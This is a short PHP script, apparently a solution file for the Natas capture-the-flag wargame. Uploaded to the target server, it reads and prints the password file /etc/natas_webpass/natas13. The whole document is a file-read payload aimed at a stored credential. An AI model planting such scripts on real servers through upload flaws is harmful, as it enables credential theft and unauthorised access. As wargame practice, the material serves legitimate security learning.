<?php
print_r(pathinfo("/etc/natas_webpass/natas13"));

$myfile = fopen("/etc/natas_webpass/natas13", "r") or die("Unable to open file!");
echo fread($myfile,filesize("/etc/natas_webpass/natas13"));
fclose($myfile);

?> 